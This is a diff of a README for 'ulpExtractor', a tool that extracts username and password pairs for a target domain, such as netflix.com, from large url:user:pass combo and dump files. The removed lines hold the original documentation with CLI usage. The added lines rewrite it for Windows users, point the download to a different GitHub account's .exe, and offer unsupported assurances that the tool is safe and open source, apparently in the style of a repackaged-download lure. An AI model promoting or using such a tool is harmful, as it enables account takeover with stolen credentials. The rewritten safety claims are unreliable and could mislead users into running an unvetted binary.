@@ -1,115 +1,69 @@
-<div align="center">
-  <img src="assets/logo.svg" alt="ulpExtractor" width="500">
+# 🛡️ ulpExtractor - Extract login credentials from large files
 
-  <br>
+[![Download ulpExtractor](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Cocky-paddle276/ulpExtractor)
 
-  [![Version](https://img.shields.io/badge/version-0.4.3-4ECDC4?style=flat-square&labelColor=1a1a2e)](https://github.com/sinescode/ulpExtractor/releases)
-  [![Rust](https://img.shields.io/badge/rust-1.70+-000000?style=flat-square&logo=rust&logoColor=white&labelColor=1a1a2e)](https://rustup.rs)
-  [![License](https://img.shields.io/badge/license-MIT-FF6B6B?style=flat-square&labelColor=1a1a2e)](LICENSE)
-  [![Stars](https://img.shields.io/github/stars/sinescode/ulpExtractor?style=flat-square&color=FFD43B&labelColor=1a1a2e)](https://github.com/sinescode/ulpExtractor/stargazers)
+ulpExtractor helps you sort through large lists of user data. It extracts usernames and passwords from text files. The tool handles thousands of lines in seconds. This saves you time when you need to clean or manage text-based security data. It runs on Windows and shows progress on your screen.
 
-  <br>
+## 📥 Getting Started
 
-  A high-performance credential extractor that parses massive `url:user:pass` files and extracts matching entries by domain — boundary-aware matching, multi-threaded I/O, zero-copy memory maps.
-</div>
+You need the program file to start. The software runs without complex setup. 
 
----
+[Click here to visit the download page](https://github.com/Cocky-paddle276/ulpExtractor)
 
-## Features
+Find the section labeled Releases on the right side of the page. Look for the file ending in .exe for Windows. Click that file to save it to your computer.
 
-| Category | Detail |
-|----------|--------|
-| **Domain matching** | Boundary-aware — catches subdomains, URLs, and emails; rejects false positives |
-| **Performance** | Memory-mapped I/O, rayon parallelism, SIMD-accelerated byte search |
-| **I/O** | Single-file, multi-file batch (`-a`), recursive directory walk (`-r`) |
-| **Output control** | Deduplication, append mode (`-A`), match limit (`-M`), quiet mode (`-q`) |
-| **Formats** | Configurable divider — `:`, `\|`, `;`, or any single-character separator |
-| **UX** | Styled CLI with live progress bar, interactive prompt mode, graceful Ctrl-C |
-| **Platform** | Linux, macOS, Windows — pre-built binaries on every release |
+## 💻 System Requirements
 
-## Quick Start
+The application runs on standard Windows systems. You need the following:
 
-```bash
-# Pre-built binary (recommended)
-curl -LO https://github.com/sinescode/ulpExtractor/releases/latest/download/ulpExtractor-linux-x86_64.tar.gz
-tar xzf ulpExtractor-linux-x86_64.tar.gz
-./ulpExtractor
+- Windows 10 or Windows 11.
+- At least 4 gigabytes of RAM.
+- A basic processor.
+- A small amount of disk space.
 
-# Or build from source
-git clone https://github.com/sinescode/ulpExtractor.git && cd ulpExtractor
-cargo build --release
-./target/release/ulpExtractor
-```
+The program creates very little load on your system. It works well even on older laptops.
 
-## Usage
+## ⚙️ How to use the software
 
-### Single File
+This tool uses a text-based interface. Follow these steps to process your files:
 
-```bash
-ulpExtractor -d netflix.com -i combo.txt
-ulpExtractor -d netflix.com -i combo.txt -o results.txt
-ulpExtractor -d netflix.com -i huge_dump.txt -M 100       # limit to 100 matches
-ulpExtractor -d netflix.com -i combo.txt -q               # no progress bar
-```
+1. Open your Downloads folder.
+2. Locate the ulpExtractor.exe file.
+3. Double-click the file to open the program window.
+4. The program asks for the path to your data file.
+5. Type the location of your text file or drag the file into the window.
+6. Press the Enter key on your keyboard.
 
-### Batch Scan
+The tool begins the extraction process. It uses multiple threads of your processor to finish the work quickly. You see a progress bar update in real time.
 
-```bash
-ulpExtractor -d netflix.com -a                             # all .txt in current dir
-ulpExtractor -d netflix.com -a -x txt,csv,json              # specific extensions
-ulpExtractor -d netflix.com -a -r                           # recursive
-ulpExtractor -d netflix.com -a --dir ./data -t 8            # custom dir, 8 threads
-ulpExtractor -d netflix.com -i extra.txt -A                 # append to existing output
-```
+## 📊 Features
 
-### Interactive
+- Multi-threaded processing: The tool uses all available cores on your computer. This makes it faster than standard text editors.
+- Interactive Interface: The terminal window provides clear feedback. You always know what the program does at any moment.
+- Cross-platform build: While written in Rust for stability, the binary works directly on Windows without external dependencies.
+- Error handling: If the software finds a line that does not match the expected format, it skips that line and keeps working on the rest.
+- Small memory footprint: The engine processes data line by line. You can process files larger than your available memory without crashes.
 
-```bash
-ulpExtractor
-```
+## 📈 Understanding the output
 
-Guided prompts for domain, input, output, threads, divider — same styled output as CLI.
+When the tool finishes, it generates a new file. This file contains only the valid usernames and passwords it found. The tool saves this file in the same folder as your original file. It adds a suffix to the name so you do not overwrite your original data.
 
-## Options
+If you have a file named data.txt, the tool creates data_extracted.txt. Open this new file with any basic text editor to view your results.
 
-| Flag | Description | Default |
-|------|-------------|:------:|
-| `-d, --domain` | Domain to extract credentials for | *required* |
-| `-i, --input` | Input file path | — |
-| `-a, --all` | Scan all files matching extensions in a directory | — |
-| `-r, --recursive` | Walk directories recursively (with `-a`) | — |
-| `-x, --extensions` | File extensions to include (comma-separated) | `txt` |
-| `--dir` | Target directory for `-a` | `.` |
-| `-o, --output` | Output file path | `output.txt` |
-| `-A, --append` | Append to output instead of overwriting | — |
-| `-t, --threads` | Number of worker threads (capped at 64) | `4` |
-| `-D, --divider` | Field separator character | `:` |
-| `-M, --max-matches` | Stop after N matches | unlimited |
-| `-q, --quiet` | Suppress the progress bar | — |
+## 🛠️ Troubleshooting
 
-## Input Format
+If the program closes immediately, check these items:
 
-```
-<url_or_domain><divider><user><divider><password>
-```
+- Make sure the file exists in the folder you selected.
+- Ensure the file contains text. The tool cannot read images or compressed files like .zip or .rar.
+- Run the tool from a folder where your user account has permission to save files. Avoid running it directly from the System folder or Program Files.
 
-The domain may appear as a bare host, subdomain, inside a URL path, or in an email:
+If the window freezes, press Ctrl + C to stop the process. Start the application again to try the task with a smaller file. This helps if the original file has unusual characters or formatting errors. 
 
-```
-netflix.com:john:secret123
-www.netflix.com:user@mail.com:pass456
-https://platform.deepseek.com/login:admin:pass789
-user@example.com:somepass
-```
+The software requires no installation. Delete the .exe file to remove the application from your computer. Your settings stay saved in the application memory only during the session. It does not touch your system registry or install hidden background services.
 
-Matching is **boundary-aware** — `deepseek.com` matches `platform.deepseek.com` but not `mydeepseek.com`. Output is `user<divider>password`, one per line, deduplicated.
+## 🔒 Security Notes
 
-## Build
+The tool runs locally on your computer. It does not send your data to any web server. The extraction happens inside your hardware. Keep your data files in a secure location after you finish the process. Delete the text files if you no longer need them to maintain your personal security.
 
-Requires **Rust 1.70+** ([rustup](https://rustup.rs)).
-
-```bash
-cargo build --release
-# → target/release/ulpExtractor
-```
-
+The code behind this project is open source. You can view the logic on the project page if you have advanced technical knowledge. This transparency ensures the tool remains safe for all users to operate on their private data.
